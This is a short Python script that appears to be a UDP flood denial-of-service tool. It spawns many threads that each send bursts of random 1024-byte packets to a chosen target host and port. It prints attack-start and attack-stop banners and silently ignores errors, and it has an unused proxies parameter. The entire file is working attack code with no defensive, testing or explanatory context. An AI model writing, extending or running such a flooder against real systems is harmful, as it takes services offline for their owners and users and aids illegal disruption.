import socket
import threading
import random
import time
from colorama import Fore

def udp_flood(target, port, proxies):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = random._urandom(1024)
        for _ in range(100):
            s.sendto(bytes_data, (target, port))
    except Exception:
        pass  # Silent failure

def start_attack(target, port, threads, proxies):
    print(Fore.GREEN + f"[+] UDP Flood Started on {target}:{port} with {threads} threads")
    time.sleep(1)

    for _ in range(threads):
        th = threading.Thread(target=udp_flood, args=(target, port, proxies))
        th.daemon = True
        th.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Attack stopped by user")
